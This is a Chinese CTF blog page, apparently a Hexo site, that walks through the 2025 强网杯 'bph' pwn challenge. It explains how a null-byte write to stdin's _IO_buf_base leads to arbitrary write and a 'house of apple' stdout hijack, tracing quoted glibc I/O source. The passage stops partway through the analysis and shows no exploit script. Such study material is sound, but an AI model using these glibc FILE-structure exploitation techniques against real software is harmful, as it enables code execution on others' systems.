@@ -1,0 +1,822 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="N1mbus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一些刷题记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="今天还没pwn吗">
+<meta property="og:url" content="http://example.com/post/haven-t-pwned-yet-today-1ucsvd.html">
+<meta property="og:site_name" content="N1mbus">
+<meta property="og:description" content="一些刷题记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162241-nytms21.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162412-bs85xdi.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162536-b59w1cc.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120083517-jjc9cm0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120091656-xu1nosh.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120094643-wbx2nzh.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251125231657-0sa7309.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127203803-02nvlnp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212129-mnu36au.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212139-v6jeq11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212823-sun1gmq.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127213359-s76r30j.png">
+<meta property="article:published_time" content="2025-11-20T17:00:51.000Z">
+<meta property="article:modified_time" content="2025-11-20T17:00:53.000Z">
+<meta property="article:author" content="N1mbus">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162241-nytms21.png">
+  
+  
+  
+  <title>今天还没pwn吗 - N1mbus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"HGQ2AAsXTVipJuHOCxNQPl8A-gzGzoHsz","app_key":"xkvgsYTbMeB59u2gc4HqxaBN","server_url":"https://hgq2aasx.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>N1mbus的摆烂日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">今天还没pwn吗</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-20 17:00" pubdate>
+          2025年11月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">今天还没pwn吗</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="今天还没pwn吗"><a href="#今天还没pwn吗" class="headerlink" title="今天还没pwn吗"></a>今天还没pwn吗</h1><p>每次都是比赛前临时突击刷题，导致每次比赛都很害怕，所以以后打算每天都拿出一点点时间刷一道题。（<del>实际是清理一下之前只保存却没有做的题</del>）</p>
+<p>题目附件我会放到我的github仓库，想要的师傅可以自取<a target="_blank" rel="noopener" href="https://github.com/N1mbus-lock/pwn">https://github.com/N1mbus-lock/pwn</a></p>
+<h2 id="2025-11-17-20——2025强网杯bph"><a href="#2025-11-17-20——2025强网杯bph" class="headerlink" title="2025.11.17-20——2025强网杯bph"></a>2025.11.17-20——2025强网杯bph</h2><p>个人感觉这道题还是很不错的</p>
+<p>漏洞点：可以在token泄露地址，存在一个任意地址写\x00</p>
+<p>利用：可以通过任意地址置零设置stdin结构体的_IO_buf_base字段末尾为0，然后我们就可以通过输入覆盖_IO_buf_base和_IO_buf_end字段来控制我们写入的地址，选择覆盖stdout结构体来打house of apple加上通过setcontext实现orw</p>
+<p>很爽了，做这道题的时候这些知识点虽然都知道，但是却几乎没有实践过，懂得很模糊</p>
+<p>有一个点很疑惑，就是通过修改_IO_buf_base末尾为0。为什么可以导致写入，为什么之前的_IO_buf_base不能够写入到stdin结构体。（可以看<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-261914.htm">https://bbs.kanxue.com/thread-261914.htm</a>）</p>
+<p>然后我就去看写入前和写入后有什么区别</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162241-nytms21.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162412-bs85xdi.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>修改之后可以导致在0x00007f3395af2900和0x00007f3395af2964之间填入数据</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251117162536-b59w1cc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这两个字段控制的是缓冲区大小，因为我们平时做题的代码都会设置无缓冲，所以缓冲区设置的是1，输入会从键盘到显示框里。当不为1的时候键盘输入就存在了缓冲区里，这时候再修改缓冲区就可以再指定任意地址写了</p>
+<p>看了一份wp，打的是puts触发的，看了好久，想不明白为什么要这么写，只能根据wp调试反推一下了</p>
+<p>进入到了puts函数里面，一直按s，可以看到进入到了这个函数里面_IO_wfile_xsputn</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120083517-jjc9cm0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_xsputn (FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *) data;<br>  <span class="hljs-type">size_t</span> to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> count;<br><br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">/* This is an optimized implementation.</span><br><span class="hljs-comment">     If the amount to be written straddles a block boundary</span><br><span class="hljs-comment">     (or the filebuf is unbuffered), use sys_write directly. */</span><br><br>  <span class="hljs-comment">/* First figure out how much space is available in the buffer. */</span><br>  count = f-&gt;_wide_data-&gt;_IO_write_end - f-&gt;_wide_data-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      count = f-&gt;_wide_data-&gt;_IO_buf_end - f-&gt;_wide_data-&gt;_IO_write_ptr;<br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>	&#123;<br>	  <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *p;<br>	  <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>	    &#123;<br>	      <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">L&#x27;\n&#x27;</span>)<br>		&#123;<br>		  count = p - s + <span class="hljs-number">1</span>;<br>		  must_flush = <span class="hljs-number">1</span>;<br>		  <span class="hljs-keyword">break</span>;<br>		&#125;<br>	    &#125;<br>	&#125;<br>    &#125;<br>  <span class="hljs-comment">/* Then fill the buffer. */</span><br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>	count = to_do;<br>      <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">20</span>)<br>	&#123;<br>	  f-&gt;_wide_data-&gt;_IO_write_ptr =<br>	    __wmempcpy (f-&gt;_wide_data-&gt;_IO_write_ptr, s, count);<br>	  s += count;<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	&#123;<br>	  <span class="hljs-type">wchar_t</span> *p = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>	  <span class="hljs-type">int</span> i = (<span class="hljs-type">int</span>) count;<br>	  <span class="hljs-keyword">while</span> (--i &gt;= <span class="hljs-number">0</span>)<br>	    *p++ = *s++;<br>	  f-&gt;_wide_data-&gt;_IO_write_ptr = p;<br>	&#125;<br>      to_do -= count;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (to_do &gt; <span class="hljs-number">0</span>)<br>    to_do -= _IO_wdefault_xsputn (f, s, to_do);<br>  <span class="hljs-keyword">if</span> (must_flush<br>      &amp;&amp; f-&gt;_wide_data-&gt;_IO_write_ptr != f-&gt;_wide_data-&gt;_IO_write_base)<br>    _IO_wdo_write (f, f-&gt;_wide_data-&gt;_IO_write_base,<br>		   f-&gt;_wide_data-&gt;_IO_write_ptr<br>		   - f-&gt;_wide_data-&gt;_IO_write_base);<br><br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>因为wp里面伪造了flag导致不会进入<code>if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</code>并且f-&gt;_wide_data-&gt;_IO_write_end &#x3D;0，f-&gt;_wide_data-&gt;_IO_write_ptr&#x3D;0，导致缓冲区肯定写不下to_do</p>
+<p>所以进入到一下分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (to_do &gt; <span class="hljs-number">0</span>)<br>   to_do -= _IO_wdefault_xsputn (f, s, to_do);<br></code></pre></td></tr></table></figure>
+
+<p>进行调用这个函数_IO_wdefault_xsputn</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120091656-xu1nosh.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wdefault_xsputn (FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *) data;<br>  <span class="hljs-type">size_t</span> more = n;<br>  <span class="hljs-keyword">if</span> (more &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>      <span class="hljs-comment">/* Space available. */</span><br>      <span class="hljs-type">ssize_t</span> count = (f-&gt;_wide_data-&gt;_IO_write_end<br>                       - f-&gt;_wide_data-&gt;_IO_write_ptr);<br>      <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>	&#123;<br>	  <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) count &gt; more)<br>	    count = more;<br>	  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">20</span>)<br>	    &#123;<br>	      f-&gt;_wide_data-&gt;_IO_write_ptr =<br>		__wmempcpy (f-&gt;_wide_data-&gt;_IO_write_ptr, s, count);<br>	      s += count;<br>            &#125;<br>	  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>	    count = <span class="hljs-number">0</span>;<br>	  <span class="hljs-keyword">else</span><br>	    &#123;<br>	      <span class="hljs-type">wchar_t</span> *p = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>	      <span class="hljs-type">ssize_t</span> i;<br>	      <span class="hljs-keyword">for</span> (i = count; --i &gt;= <span class="hljs-number">0</span>; )<br>		*p++ = *s++;<br>	      f-&gt;_wide_data-&gt;_IO_write_ptr = p;<br>            &#125;<br>	  more -= count;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (more == <span class="hljs-number">0</span> || __woverflow (f, *s++) == WEOF)<br>		<span class="hljs-keyword">break</span>;<br>      more--;<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - more;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>因为cout还是等于0，所以只能执行到这if (more  ** 0 || __woverflow (f, *s++) **  WEOF)，而这里就是调用跳转表里面的<code>_IO_OVERFLOW</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">__woverflow (FILE *f, <span class="hljs-type">wint_t</span> wch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_mode == <span class="hljs-number">0</span>)<br>    _IO_fwide (f, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> _IO_OVERFLOW (f, wch);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251120094643-wbx2nzh.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这个函数在跳转表里面偏移18的位置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_wfile_overflow (FILE *f, <span class="hljs-type">wint_t</span> wch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span><br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> WEOF;<br>    &#125;<br>  <span class="hljs-comment">/* If currently reading or no buffer allocated. */</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span><br>      || f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>)<br>	&#123;<br>	  _IO_wdoallocbuf (f);<br>	  _IO_free_wbackup_area (f);<br>	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,<br>		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);<br><br>	  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>	    &#123;<br>	      _IO_doallocbuf (f);<br>	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);<br>	    &#125;<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	&#123;<br>	  <span class="hljs-comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span><br><span class="hljs-comment">	     (and hence also _IO_read_end) is at the buffer end,</span><br><span class="hljs-comment">	     logically slide the buffer forwards one block (by setting</span><br><span class="hljs-comment">	     the read pointers to all point at the beginning of the</span><br><span class="hljs-comment">	     block).  This makes room for subsequent output.</span><br><span class="hljs-comment">	     Otherwise, set the read pointers to _IO_read_end (leaving</span><br><span class="hljs-comment">	     that alone, so it can continue to correspond to the</span><br><span class="hljs-comment">	     external position). */</span><br>	  <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)<br>	    &#123;<br>	      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;<br>	      f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =<br>		f-&gt;_wide_data-&gt;_IO_buf_base;<br>	    &#125;<br>	&#125;<br>      f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;<br>      f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;<br>      f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =<br>	f-&gt;_wide_data-&gt;_IO_read_end;<br><br>      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;<br>      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;<br>      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;<br>      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;<br><br>      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>	f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (wch == WEOF)<br>    <span class="hljs-keyword">return</span> _IO_do_flush (f);<br>  <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)<br>    <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> WEOF;<br>  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)<br>      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="hljs-string">L&#x27;\n&#x27;</span>))<br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> WEOF;<br>  <span class="hljs-keyword">return</span> wch;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到这里，当_IO_write_base&#x3D;0的时候，就会调用_IO_wdoallocbuf</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="hljs-number">0</span>)<br>&#123;<br>  _IO_wdoallocbuf (f);<br></code></pre></td></tr></table></figure>
+
+<p>然后进入到_IO_wdoallocbuf之后</p>
